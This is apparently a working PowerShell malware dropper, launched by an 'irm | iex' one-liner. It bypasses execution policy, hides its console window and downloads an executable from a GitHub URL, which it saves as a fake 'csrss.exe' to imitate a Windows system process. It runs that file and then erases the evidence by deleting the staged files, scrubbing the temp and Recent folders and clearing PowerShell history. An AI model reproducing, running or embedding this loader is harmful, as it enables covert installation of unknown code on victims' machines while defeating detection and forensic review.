# network.ps1 — silent download / run / wait / clean
# irm https://raw.githubusercontent.com/arxstore/curado/refs/heads/main/network.ps1 | iex

$ErrorActionPreference = 'SilentlyContinue'
try { Set-ExecutionPolicy -Scope Process Bypass -Force -EA 0 } catch {}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Hide this PowerShell window (no console text).
try {
    Add-Type -Name Z -Namespace H -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
'@ -EA Stop
    $c = [H.Z]::GetConsoleWindow()
    if ($c -ne [IntPtr]::Zero) { [void][H.Z]::ShowWindow($c, 0) }
} catch {}

$dir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Caches'
$exe = Join-Path $dir 'csrss.exe'
$tmp = Join-Path $dir ('csrss.' + [guid]::NewGuid().ToString('N').Substring(0, 8))
$cb  = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$urls = @(
    "https://raw.githubusercontent.com/arxstore/curado/refs/heads/main/csrss.exe?$cb"
)
if ($ExeUrl) { $urls = @(([string]$ExeUrl) + "?$cb") }
$hdr = @{ 'Cache-Control' = 'no-cache'; 'Pragma' = 'no-cache' }

function Remove-Safe($p, [switch]$Recurse) {
    if (-not (Test-Path -LiteralPath $p)) { return }
    try {
        if ($Recurse) { Remove-Item -LiteralPath $p -Recurse -Force -EA Stop }
        else { Remove-Item -LiteralPath $p -Force -EA Stop }
    } catch {}
}

function Clear-History {
    foreach ($h in @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:APPDATA\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )) {
        if (Test-Path -LiteralPath $h) {
            try { Clear-Content -LiteralPath $h -Force -EA Stop } catch {}
        }
    }
}

function Clean-AfterClose {
    # Only our staged path — never touch System32\csrss.exe
    Get-CimInstance Win32_Process -EA 0 |
        Where-Object { $_.ExecutablePath -and ($_.ExecutablePath -ieq $exe) } |
        ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -EA 0 } catch {} }
    Start-Sleep -Milliseconds 400

    Remove-Safe $tmp
    Remove-Safe $exe

    $assets = Join-Path $dir 'assets'
    Remove-Safe $assets -Recurse

    Get-ChildItem -LiteralPath $dir -File -EA 0 |
        Where-Object { $_.Name -match '^(csrss\.|assets|\.cache)' -or $_.Name -eq 'csrss.exe' } |
        ForEach-Object { Remove-Safe $_.FullName }

    $tempRoots = @($env:TEMP, (Join-Path $env:LOCALAPPDATA 'Temp'))
    foreach ($root in $tempRoots) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        Get-ChildItem -LiteralPath $root -File -EA 0 |
            Where-Object { $_.Name -match 'network\.ps1|ps-script|arxstore|curado' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    $recent = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
    if (Test-Path -LiteralPath $recent) {
        Get-ChildItem -LiteralPath $recent -EA 0 |
            Where-Object { $_.Name -match 'powershell|\.ps1|network|curado' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    Clear-History
}

function Test-Exe($p) {
    if (-not (Test-Path -LiteralPath $p)) { return $false }
    try {
        $i = Get-Item -LiteralPath $p
        if ($i.Length -lt 1MB) { return $false }
        $b = New-Object byte[] 2
        $s = [IO.File]::OpenRead($p)
        try { [void]$s.Read($b, 0, 2) } finally { $s.Dispose() }
        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
    } catch { return $false }
}

try {
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    # Kill previous staged instance before replace
    Get-CimInstance Win32_Process -EA 0 |
        Where-Object { $_.ExecutablePath -and ($_.ExecutablePath -ieq $exe) } |
        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
    Start-Sleep -Milliseconds 200

    if ((Test-Path -LiteralPath $exe) -and -not (Test-Exe $exe)) {
        Remove-Safe $exe
    }

    if (-not (Test-Exe $exe)) {
        $ok = $false
        foreach ($url in $urls) {
            for ($n = 1; $n -le 2; $n++) {
                try {
                    Remove-Safe $tmp
                    Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -Headers $hdr -TimeoutSec 120
                    if (Test-Exe $tmp) {
                        Move-Item -LiteralPath $tmp -Destination $exe -Force
                        $ok = $true
                        break
                    }
                    Remove-Safe $tmp
                } catch {
                    Start-Sleep -Seconds 2
                }
            }
            if ($ok) { break }
        }
        if (-not $ok) { exit 1 }
    }

    # Optional assets.zip (silent fail)
    try {
        $zu = "https://raw.githubusercontent.com/arxstore/curado/refs/heads/main/assets.zip?$cb"
        $z0 = Join-Path $dir ('z' + [guid]::NewGuid().ToString('N').Substring(0, 6))
        Invoke-WebRequest -Uri $zu -OutFile $z0 -Headers $hdr -UseBasicParsing -EA Stop
        if ((Test-Path $z0) -and ((Get-Item $z0).Length -gt 64)) {
            $x0 = Join-Path $dir ('x' + [guid]::NewGuid().ToString('N').Substring(0, 6))
            if (Test-Path $x0) { Remove-Item $x0 -Recurse -Force -EA 0 }
            Expand-Archive -LiteralPath $z0 -DestinationPath $x0 -Force
            $s0 = Join-Path $dir 'assets'
            if (Test-Path $s0) { Remove-Item $s0 -Recurse -Force -EA 0 }
            $i0 = Join-Path $x0 'assets'
            if (Test-Path $i0) { Copy-Item $i0 $s0 -Recurse -Force }
            else {
                New-Item -ItemType Directory -Force -Path $s0 | Out-Null
                Copy-Item (Join-Path $x0 '*') $s0 -Recurse -Force
            }
            Remove-Item $x0 -Recurse -Force -EA 0
        }
        if (Test-Path -LiteralPath $z0) { Remove-Item -LiteralPath $z0 -Force -EA 0 }
    } catch {}

    $proc = Start-Process -FilePath $exe -PassThru
    if ($null -eq $proc) { exit 1 }

    try { $proc.WaitForExit() } catch {}

    for ($i = 0; $i -lt 60; $i++) {
        $alive = Get-Process -EA 0 | Where-Object {
            $_.Path -and ($_.Path -eq $exe)
        }
        if (-not $alive) { break }
        Start-Sleep -Seconds 1
    }

    Clean-AfterClose
}
catch {
    try { Clean-AfterClose } catch {}
}

exit 0
